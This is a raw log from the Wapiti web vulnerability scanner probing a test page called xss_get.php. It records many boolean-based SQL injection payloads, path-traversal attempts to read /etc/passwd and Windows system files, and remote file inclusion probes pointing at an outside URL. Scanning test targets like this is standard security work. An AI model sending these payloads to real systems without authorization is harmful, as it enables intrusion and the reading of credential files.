2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:43.401 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%27%20AND%2067%3D106%20AND%20%2716%27%3D%2716&form=submit (1)
2024-03-20 16:49:43.433 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%27%20AND%2029%3D125%20AND%20%2750%27%3D%2750&form=submit (1)
2024-03-20 16:49:43.466 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%27%20AND%2014%3D14%20AND%20%2758%27%3D%2758&form=submit (1)
2024-03-20 16:49:43.493 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%22%20AND%2073%3D104%20AND%20%2225%22%3D%2225&form=submit (1)
2024-03-20 16:49:43.526 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%22%20AND%2090%3D165%20AND%20%2250%22%3D%2250&form=submit (1)
2024-03-20 16:49:43.557 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%22%20AND%2012%3D12%20AND%20%2285%22%3D%2285&form=submit (1)
2024-03-20 16:49:43.589 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%29%20AND%2079%3D123%20AND%20%2854%3D54&form=submit (1)
2024-03-20 16:49:43.616 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%29%20AND%2046%3D132%20AND%20%2872%3D72&form=submit (1)
2024-03-20 16:49:43.640 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%29%20AND%2088%3D88%20AND%20%2851%3D51&form=submit (1)
2024-03-20 16:49:43.666 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%27%29%20AND%2033%3D57%20AND%20%28%2754%27%3D%2754&form=submit (1)
2024-03-20 16:49:43.691 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%27%29%20AND%2073%3D165%20AND%20%28%2780%27%3D%2780&form=submit (1)
2024-03-20 16:49:43.717 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%27%29%20AND%2016%3D16%20AND%20%28%2793%27%3D%2793&form=submit (1)
2024-03-20 16:49:43.742 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%22%29%20AND%2042%3D107%20AND%20%28%2269%22%3D%2269&form=submit (1)
2024-03-20 16:49:43.767 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%22%29%20AND%2034%3D104%20AND%20%28%2275%22%3D%2275&form=submit (1)
2024-03-20 16:49:43.792 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%22%29%20AND%2031%3D31%20AND%20%28%2274%22%3D%2274&form=submit (1)
2024-03-20 16:49:43.817 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%20AND%2079%3D150%20AND%2029%3D29 (1)
2024-03-20 16:49:43.843 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%27%20AND%2015%3D41%20AND%20%2721%27%3D%2721 (1)
2024-03-20 16:49:43.867 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%22%20AND%2011%3D84%20AND%20%2255%22%3D%2255 (1)
2024-03-20 16:49:43.893 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%29%20AND%2047%3D100%20AND%20%2843%3D43 (1)
2024-03-20 16:49:43.918 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%27%29%20AND%2026%3D55%20AND%20%28%2767%27%3D%2767 (1)
2024-03-20 16:49:44.024 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%22%29%20AND%2080%3D99%20AND%20%28%2272%22%3D%2272 (1)
2024-03-20 16:49:44.055 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_get.php (1)
2024-03-20 16:49:44.080 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48
2024-03-20 16:49:44.081 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%C2%BF%27%22%28&bug=48
2024-03-20 16:49:44.086 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%C2%BF%27%22%28
2024-03-20 16:49:44.099 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%20AND%2080%3D162%20AND%2095%3D95&bug=48
2024-03-20 16:49:44.105 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%27%20AND%2041%3D130%20AND%20%2785%27%3D%2785&bug=48
2024-03-20 16:49:44.112 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%22%20AND%2021%3D54%20AND%20%2291%22%3D%2291&bug=48
2024-03-20 16:49:44.118 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%29%20AND%2080%3D150%20AND%20%2857%3D57&bug=48
2024-03-20 16:49:44.125 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%27%29%20AND%2067%3D129%20AND%20%28%2795%27%3D%2795&bug=48
2024-03-20 16:49:44.132 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%22%29%20AND%2012%3D43%20AND%20%28%2234%22%3D%2234&bug=48
2024-03-20 16:49:44.138 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%20AND%2064%3D156%20AND%2027%3D27
2024-03-20 16:49:44.145 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%20AND%2016%3D49%20AND%2017%3D17
2024-03-20 16:49:44.151 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%20AND%2028%3D28%20AND%2014%3D14
2024-03-20 16:49:44.159 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%27%20AND%2061%3D104%20AND%20%2727%27%3D%2727
2024-03-20 16:49:44.165 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%27%20AND%2067%3D79%20AND%20%2744%27%3D%2744
2024-03-20 16:49:44.171 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%27%20AND%2053%3D53%20AND%20%2754%27%3D%2754
2024-03-20 16:49:44.178 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%22%20AND%2051%3D94%20AND%20%2273%22%3D%2273
2024-03-20 16:49:44.185 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%22%20AND%2010%3D24%20AND%20%2292%22%3D%2292
2024-03-20 16:49:44.193 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%22%20AND%2076%3D76%20AND%20%2295%22%3D%2295
2024-03-20 16:49:44.199 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%29%20AND%2065%3D163%20AND%20%2890%3D90
2024-03-20 16:49:44.206 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%29%20AND%2094%3D189%20AND%20%2872%3D72
2024-03-20 16:49:44.213 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%29%20AND%2082%3D82%20AND%20%2831%3D31
2024-03-20 16:49:44.219 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%27%29%20AND%2092%3D106%20AND%20%28%2795%27%3D%2795
2024-03-20 16:49:44.231 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%27%29%20AND%2043%3D119%20AND%20%28%2776%27%3D%2776
2024-03-20 16:49:44.241 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%27%29%20AND%2054%3D54%20AND%20%28%2710%27%3D%2710
2024-03-20 16:49:44.251 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%22%29%20AND%2010%3D82%20AND%20%28%2270%22%3D%2270
2024-03-20 16:49:44.261 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%22%29%20AND%2029%3D81%20AND%20%28%2234%22%3D%2234
2024-03-20 16:49:44.271 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%22%29%20AND%2019%3D19%20AND%20%28%2238%22%3D%2238
2024-03-20 16:49:44.286 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:49:44.287 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%C2%BF%27%22%28&security_level=2
2024-03-20 16:49:44.293 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=submit%C2%BF%27%22%28
2024-03-20 16:49:44.310 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%20AND%2077%3D122%20AND%2074%3D74&security_level=2
2024-03-20 16:49:44.318 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%27%20AND%2056%3D153%20AND%20%2781%27%3D%2781&security_level=2
2024-03-20 16:49:44.329 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%22%20AND%2040%3D131%20AND%20%2219%22%3D%2219&security_level=2
2024-03-20 16:49:44.338 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%29%20AND%2048%3D110%20AND%20%2863%3D63&security_level=2
2024-03-20 16:49:44.351 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%27%29%20AND%2097%3D155%20AND%20%28%2777%27%3D%2777&security_level=2
2024-03-20 16:49:44.362 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit%22%29%20AND%2055%3D115%20AND%20%28%2297%22%3D%2297&security_level=2
2024-03-20 16:49:44.369 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%20AND%2076%3D174%20AND%2075%3D75
2024-03-20 16:49:44.376 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%27%20AND%2065%3D113%20AND%20%2747%27%3D%2747
2024-03-20 16:49:44.385 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%22%20AND%2088%3D156%20AND%20%2213%22%3D%2213
2024-03-20 16:49:44.393 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%29%20AND%2063%3D155%20AND%20%2893%3D93
2024-03-20 16:49:44.402 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%27%29%20AND%2097%3D141%20AND%20%28%2797%27%3D%2797
2024-03-20 16:49:44.414 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2%22%29%20AND%2065%3D116%20AND%20%28%2252%22%3D%2252
2024-03-20 16:49:44.445 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 16:49:44.454 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.475 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.485 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.495 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.504 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.514 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.529 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.545 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.577 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.593 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.608 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.623 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.637 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.651 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.681 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.696 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.711 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.726 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.742 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
2024-03-20 16:49:44.814 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&firstname=fuzz&form=submit (0)
